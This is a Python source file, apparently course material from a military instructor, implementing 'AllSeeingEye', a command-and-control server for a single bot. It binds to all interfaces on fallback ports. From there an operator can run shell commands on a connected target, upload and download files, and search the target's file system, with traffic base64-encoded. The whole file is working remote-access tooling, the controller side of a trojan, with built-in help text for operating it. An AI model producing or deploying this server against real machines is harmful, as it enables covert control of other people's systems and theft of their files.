# Name: MSgt Robert Hendrickson
# ID:   instructor5 
# Date: 7 OC:T 2021
"""
This program will create a server for Command and control of one bot.
USAGE: ~$ python3 AllSeeingEye.py
base64 module required for encoding send/recieve data.
socket module required for send/recieve data
hashlib module/md5 function required for md5 hash of file
re module required for regular expression usage
os module required to check directory on host system to verify upload file
sys module used for exiting the program
PSUEDOCODE in BotServer.txt
"""
import base64
import socket
import hashlib
import re
import os
import sys


def mysendall(socket, data, delimiter):
    """
    This is a send function for sending information to the server
    :socket: The socket object used for communication with the client
    :data: the data to send to the client
    :delimiter: a string that will signify the end of the data
    :E_data: the base64 encoded data to send to the client
    """
    E_data = base64.b64encode(data) + delimiter
    return socket.sendall(E_data)


def myrecvall(socket, delimiter):
    """
    This is a recieve function that will decode the communication with
    the server
    :socket: the socket object used for communication with the client
    :delimiter: a string used to signify the end of the data
    :size: an integer that is the data buffer size for our recieve loop
    :data: the data that is being recieved from the client
    """
    # Initialize the data variable for the contents from the client
    data = b''
    # Keep recieving data until delimiter is at the end
    while not data.endswith(delimiter):
        data += socket.recv(4096)
    # base 64 decode and convert the bytes to a string
    D_data = base64.b64decode(data[:-len(delimiter)])
    # now we return the decoded data that was recieved from the client
    return D_data


def upload(socket, delimiter):
    """
    This function will get a user specified file from the host system
    and send it to the target system.
    :socket: the socket object passed from the main function
    :filename: the full file path on host system for upload file
    :targetloc: the full file path on the target system
    :delimiter: this will signify the end of the file
    """
    while True:
        # Get file name from user
        print("[-] Please provide the absolute path for the server file")
        filename = input("[-] What is the server file?> ")
        # Try to open the file in read binary mode to send to the client
        try:
            with open(filename, 'rb') as f:
                # The file contents will be saved in a variable for
                # use later
                data = f.read() 
        except Exception as e:
            # If there is an error print the error to the server user
            print('[-] ERROR:\nTried to open '+filename+'\nReceieved Error: '+str(e))
            # Once we print the error start the loop again.
            continue 
        else: 
            # Get the location from the user and encode it as bytes
            print('[-] Please provide the absolute path of the client destination')
            targetloc = input("[-] Where do you want to put it?> ")
            targetloc = targetloc.encode()
            # Send the targetlocation to the client
            mysendall(socket, targetloc, delimiter)
            # recieve client message
            print(myrecvall(socket, delimiter).decode())
            # If no errors base 64 encode file contents and send through 
            # socket
            mysendall(socket, data, delimiter)
            # We recieve the response from the client
            print(myrecvall(socket, delimiter).decode())
            # We tell the client we are ready for the next thing
            data = b'[-] Next'
            mysendall(socket, data, delimiter)
            break
    c_response = myrecvall(socket, delimiter).decode()
    if '[!] ERROR'  in c_response:
        print("[-] ERROR:"+c_response)
    else:
        print(c_response)
   

def searcher(socket, delimiter):
    """
    This function will send the search command to the client
    and retrieve the file with hash.
    :socket: the socket object to send the command through.
    :delimiter: a string that will signify the end of the data
    :D_recvd: the recieved data from the client
    """
    # We will get the file location to start the search and encode it
    fileloc = input("[-] Where should we start looking?> ").encode()
    # We send the file location to the client to start the search
    mysendall(socket, fileloc, delimiter) 
    # We print the response from the client
    print(myrecvall(socket, delimiter).decode())
    # We ask the user if the file name is known and encode the response
    data = input('[-] Do you know the file name?> ').encode()
    # We send that data to the client
    mysendall(socket, data, delimiter)
    # We get the client response back
    known = myrecvall(socket, delimiter).decode()
    # We print the response
    print(known)
    # if the name is known we get the name and send it to the client
    if 'y' in known:
        data = input('[-] What is the file name?> ').encode()
        mysendall(socket, data, delimiter)
    else:
        # If the name is unknown we send unknown to the client
        data = b'[-] Unknown'
        mysendall(socket, data, delimiter)
    # We tell the user that we are starting the search
    print("[-] Searching for file...")
    # We get the response from the search
    D_recvd = myrecvall(socket, delimiter).decode()
    # Now we check if there was anything in our list, if so print the items
    if not D_recvd.startswith('[]'):
        D_recvd = D_recvd.split("'")
        for item in D_recvd:
            if '[' not in str(item) or ']' not in str(item):
                print(item)
    else:
        # If nothing there print the message
        print('[-] No results returned from client')

    data = b'[-] Next'
    mysendall(socket, data, delimiter)
    myrecvall(socket,delimiter).decode()
    

def helper():
    """
    This is a help function for the server
    :basic_str: the basic server fucntionality
    :advanced_str: server functionality with example usage of each command and example output
    """
    basic_str = """
    You will see the following prompt once you connect to a client:
    [-] <username>@<user_ip>:<user_working_dir> > server command
    For example, if connecting to sam at 127.0.0.1 in the home folder:
    [-] sam@127.0.0.1:/home> server command
    
    Server commands are listed below 
    command - Send a shell command to the target system
    download - download(recieve) a file from the target system
    upload - Upload(send) a file ot the target system
    search - search the target for specified files using regular expressions
    help - Display server commands
    quit - exit the program
    """ 

    advanced_str = """
    The script will start as follows:
    [-] Listening for connections...(until you recieve a connection)
    [-] Connection Recieved
    [-] Connection established with client at <ip>

    [-] Server commands are as follows, enter them as shown:
        command
        download
        upload
        search
        help
        quit

    [-] user@ip:working_dir> 

    You will see the following prompt once you connect to a client:
    [-] <username>@<user_ip>:<user_working_dir> > server command
    For example, if connecting to sam at 127.0.0.1 in the home folder:
    [-] sam@127.0.0.1:/home> server command
    
    Server commands are listed below with example usage and output everything 
    inside <> will need to be replaced with your data or commands. 

    For download and upload, the absolute path is required for source file and destination.
    The absolute path includes the file name and extention.
    
    command     - Send shell commands to the client. 

        [-] <username>@<user_ip>:<user_working_dir> > command
        [!] Ready for command
        [-] What command?> <shell command>
        <command output if there is any>
        [!] Client command Complete

    download    - recieve a file from the client.

        [-] <username>@<user_ip>:<user_working_dir> > download
        [-] Please provide the absolute path for the client file and server destination
        [!] Ready for file name
        [-] What is the client file?> <Full path to file with extention>
        [-] What is the server destination?> <Full path to new location with extention>
        [-] File successfully downloaded to : <path provided>
        [!] Client command complete

    upload      - send a file to the client.

        [-] <username>@<user_ip>:<user_working_dir> > upload
        [-] Please provide the absolute path for the server file 
        [-] What server file?> <full file path of server file>
        [-] Please provide the absolute path for the client destination:>
        [-] What client destination?> <full file path to destination on the client system>
        [!] Ready for file contents
        [!] File uploaded to client at : <file location specified>
        [!] Client Command Complete
  
    search      - search the file system using regular expressions

        [-] <username>@<user_ip>:<user_working_dir> > search
        [-] Where should we start looking?> <start location on client>
        [-] Do you know the file name?> <yes or no>
    If you answer yes:
        [!] Ready for file name
        [-] What is the file name?> <file name on client system>
    If you answer no:
        [!] No file name, using default pattern
    
        [-] Searching for file...
        <Results of search>
        [!] Client command complete
     
    help        - display the basic or advanced help string
        
        [-] <username>@<user_ip>:<user_working_dir> > help
        [-] Would you like the basic or advanced help?> <basic or advanced>
        <help string>

    quit        - exit the program

        [-] <username>@<user_ip>:<user_working_dir> quit
        [-] Listening for Connections...
    """
    ask = input("[-] Would you like to view the basic or advanced help?> ")
    # Check if the user entered basic or advanced
    if 'basic' in ask.lower():
        print(basic_str)
    elif 'advanced' in ask.lower():
        print(advanced_str)

def download(socket, delimiter):
    """
    This will download files from the client
    :data: The name of the file on the client system 
    :recvd: the file contents from the client
    :theFile: The destination location on the server
    """
    # Receive the file path comment from client
    print(myrecvall(socket, delimiter).decode())
    # Send the full file path to the bot
    print('[-] Please provide the absolute path for the client file')
    data = input('[-] What is the client file?> ').encode()
    mysendall(socket, data, delimiter)
    # We recieve the client file contents
    recvd = myrecvall(socket, delimiter).decode()
    # Check if there is an error. print the error
    if recvd.startswith('[!] ERROR'):
        print(recvd)
    # If no error, strip delimiter, base64 decode the file
    # prompt the user where to save the file. Write the
    # file in binary mode at the location.
    else:
        print('[-] Please provide the absolute path to the server destination')
        theFile = input("[-] What is the server destination?> ")
        with open(theFile, 'w') as outFile:
            outFile.write(recvd)
    print("[-] File successfully downloaded to: {}".format(theFile))
    # This will sync the server and client
    data = b'[-] Next'
    # Now we send the ready message to the client
    mysendall(socket, data, delimiter)
    # Now we print the message from the client
    print(myrecvall(socket, delimiter).decode())


def command(socket, delimiter):
    """
    This function will send commands to the client
    :data: the command to send to the client
    :output: the output sent from the client
    """
    # We print that the client is ready for the command
    print(myrecvall(socket, delimiter).decode())
    # Now we store the command into a variable
    data = input('[-] What command?> ').encode()
    # Now we send the variable to the client
    mysendall(socket, data, delimiter)
    # Now we check if there is a client message or command output
    output = myrecvall(socket, delimiter).decode()
    # If there is an error or message it will start with [!]
    if output.startswith('[!]'):
        print(output, end='')
    else:
        # If it doesn't start with [!] it will print a line to separate the the output from the command
        print('[-] Command output:')
        print(output, end='')
    # Now we tell the client we are ready for the next command
    mysendall(socket, b'[-] Next', delimiter)
    # We recieve the client message
    print(myrecvall(socket, delimiter).decode())


def main():
    """
    This function will establish a socket with the client and connect.
    :port: will be the port that is open for the client to connect to.
    :ip: this will be the server ip we will bind
    :delimiter: this is a custom delimiter that we set for sending and
                recieving information from the client.
    :srvr: this is the server socket that the client will connect to.
    :conn: this is the connection object that python will use
    :addr: this is the port, ip tuple that the connection will use
    :data: This is the information that is sent accross the socket
    :recvd: this is the base64 encoded data from the client
    :D_recvd: this is the decoded data from the client
    :theFile: this is the file location that we will use to save
              downloaded items
    :mysendall: a function for sending information on the server
    :myrecvall: a function for recieving information on the server
    :srvr_cmds: the available server commands, refer to the help function for information
    """
    srvr_cmds="""\n[-] Server commands are as follows, enter them as shown:
    command  
    download
    upload
    search
    help
    quit

"""
    # We will set get input for variables
    ports = [8888,7777,6666,5555]
    ip = '0.0.0.0'
    delimiter = b"!!@@##$$!!"
    # We will now set up the server for connections
    srvr = socket.socket() # Set up the socket object
    for port in ports:
        try:
            srvr.bind((ip, port)) # bind to the ip and port from user input
        except socket.error:
            continue
        else:
            break
    srvr.listen(1) # Wait for connection to the client
    # Now we have to accept the connections and handle the communication
    # with the client
    try:
        # Now we will start a while loop that will accept a connection. 
        # If the client drops the server will remain up.
        while True:
            print("[-] Listening for connections...")
            # we will now use the accept method once a client reaches out
            conn, addr =  srvr.accept()
            # Print that a connection has occured
            print("[-] Connection established with client at", addr[0])
            # initialize an internal while loop for data handling
            data = b'start'
            while data != b'quit':
                # We get the working directory and username from the client.
                client_info = myrecvall(conn, delimiter).decode()
                # split the information recieved and use the name and working dir as prompt
                client_name, client_CWD = client_info.split(';')
                # We print the server commands
                print(srvr_cmds)
                # Now we have our prompt: [-] user@ip:working_directory> 
                print("[-] "+client_name+"@"+addr[0]+': '+client_CWD, end='')
                # This will take the byte encoded input from the user and save it in a variable
                data = input("> ").encode()
                # This will call the function defined above, we are passing the connection
                mysendall(conn, data, delimiter) 
                # We will start our conditional for dealing with the data
                if data == b'download':
                    download(conn, delimiter)
                    continue
                elif data == b'quit':
                    # now we deal with a QUIT from the user
                    break
                elif data == b'upload':
                    # now we deal wih an upload command recieved from user
                    upload(conn, delimiter)
                    continue
                elif data == b'search':
                    # Now we will use our searcher function 
                    # to search the client
                    print(searcher(conn, delimiter))
                    continue
                elif data == b'command':
                    command(conn, delimiter)
                    continue

                elif data == b'help':
                    # If help is recieved it will call the helper function
                    helper()
                    continue 
        # this will close the socket obejct
        srvr.close()
    except KeyboardInterrupt:
        print("\n[-] Good Day Sir! I said good day!")       
        srvr.close()
        sys.exit()
    except Exception as e:
        print("[-] {}".format(e))
        srvr.close()

if __name__ == "__main__":
    main() 

